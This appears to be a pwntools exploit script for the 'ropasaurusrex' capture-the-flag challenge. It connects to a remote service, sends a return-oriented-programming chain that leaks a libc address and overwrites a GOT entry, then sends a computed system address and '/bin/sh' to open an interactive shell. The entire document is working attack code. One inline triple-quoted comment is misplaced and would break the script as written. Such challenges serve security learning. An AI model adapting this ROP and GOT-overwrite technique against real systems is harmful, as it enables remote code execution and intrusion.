from pwn import *
"""p = process("/home/newbie/babamba/ropasaurusrex")"""
p = remote("remote.goatskin.kr",31303)
context.log_level = "debug"

""" got overwrite """
payload = ""
for i in range(40) :
    payload += p32(0x080484b9)
payload += p32(0x0804830c)
payload += p32(0x080484b6)
payload += p32(1)
payload += p32(0x08049614)
payload += p32(4)
payload += p32(0x0804832c)
payload += p32(0x080484b6)
payload += p32(0)
payload += p32(0x08049614)
payload += p32(4)
payload += p32(0x0804832c)
payload += p32(0x080484b6)
payload += p32(0)
payload += p32(0x08049638)
payload += p32(8)
payload += p32(0x0804830c)
payload += p32(0)
payload += p32(0x08049638)
payload += "A" * 24

p.send(payload)
libc = p.recvn(4) """ => receive n bytes from output """
payload2 = p32(u32(libc) - 0x9e930)
payload3 = "/bin/sh\0"
p.send(payload2)
p.send(payload3)
p.interactive()
